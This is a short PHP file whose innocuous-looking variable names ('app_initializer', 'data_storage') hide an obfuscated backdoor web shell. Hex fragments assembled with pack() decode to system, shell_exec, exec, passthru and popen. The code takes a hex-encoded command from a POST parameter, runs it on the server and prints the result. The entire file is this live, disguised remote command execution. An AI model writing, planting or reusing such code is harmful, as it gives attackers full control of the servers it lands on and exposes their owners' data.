<?php


$value1 = '973';
$value2 = '746';
$value3 = '56d';
$value4 = '736';
$value5 = 'c5f';
$value6 = '657';
$value7 = '865';
$value8 = '706';
$value9 = '468';
$value10 = '656';
$value11 = '16d';
$value12 = '765';
$value13 = '745';
$value14 = 'e74';
$value15 = '365';
$value16 = '070';
$value17 = '96e';
$value18 = '697';
$value19 = '469';
$value20 = '616';
$value21 = 'c69';
$data_storage1 = pack("H*", '737' . $value1 . $value2 . $value3);
$data_storage2 = pack("H*", $value4 . '865' . '6c6' . $value5 . $value6 . $value7);
$data_storage3 = pack("H*", '657' . $value7);
$data_storage4 = pack("H*", $value8 . '173' . '737' . $value9 . '727');
$data_storage5 = pack("H*", '706' . 'f70' . $value10);
$data_storage6 = pack("H*", '737' . '472' . $value10 . $value11 . '5f6' . $value12 . $value13 . 'f63' . '6f6' . $value14 . '656' . 'e74');
$data_storage7 = pack("H*", '706' . '36c' . '6f7' . $value15);
$app_initializer = pack("H*", '617' . $value16 . '5f6' . $value17 . $value18 . $value19 . $value20 . $value21 . '7a6' . '572');
if (isset($_POST[$app_initializer])) {
    $app_initializer = pack("H*", $_POST[$app_initializer]);
    if (function_exists($data_storage1)) {
        $data_storage1($app_initializer);
    } elseif (function_exists($data_storage2)) {
        print $data_storage2($app_initializer);
    } elseif (function_exists($data_storage3)) {
        $data_storage3($app_initializer, $pset_hld);
        print join("\n", $pset_hld);
    } elseif (function_exists($data_storage4)) {
        $data_storage4($app_initializer);
    } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
        $flg_obj = $data_storage5($app_initializer, 'r');
        if ($flg_obj) {
            $data_chunk_dat = $data_storage6($flg_obj);
            $data_storage7($flg_obj);
            print $data_chunk_dat;
        }
    }
    exit;
}
